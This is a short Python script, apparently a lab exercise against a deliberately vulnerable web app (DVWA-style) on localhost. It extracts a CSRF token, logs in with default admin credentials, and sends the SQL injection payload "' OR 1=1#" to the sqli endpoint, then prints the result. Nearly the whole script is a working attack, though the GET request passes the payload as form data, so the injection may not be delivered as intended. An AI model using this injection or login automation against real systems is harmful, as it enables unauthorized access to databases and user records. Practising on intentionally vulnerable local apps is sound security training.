
import requests
from src.recon.spider import html_extractor
from bs4 import BeautifulSoup

# Cria uma sessão para manter cookies e headers
session_actual = requests.Session()

def login_test(url, dictionary_login, session):
    """Realiza o POST de login e retorna o response."""
    try:
        response = session.post(url, data=dictionary_login)
        return response
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return

def token_extractor(url, token_name, session):
    """Extrai o valor do token CSRF da página de login."""
    soup = html_extractor(url, session)
    token = soup.find("input", {"name": token_name})['value']
    return token

# Extrai o token CSRF da página de login
user_token = token_extractor("http://localhost/login.php", "user_token", session_actual)

# Monta o dicionário de login
dictionary_login = {
    "username": "admin",
    "password": "password",
    "user_token": f"{user_token}",
    "Login": "Login"
}

dictionary_sql_injection = {
    "id" : "' OR 1=1#",
    "Submit" : "Submit"
}

def get_user_id(url, dictionary_sql_injection, session):
    """Realiza o GET com SQL Injection e retorna o response."""
    try:
        response = session.get(url, data=dictionary_sql_injection)
        return response
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return


# Realiza o login
resposta = login_test("http://localhost/login.php", dictionary_login, session_actual)
resposta = get_user_id("http://localhost/vulnerabilities/sqli/", dictionary_sql_injection, session_actual)

# Exibe o HTML retornado
print(resposta.text)
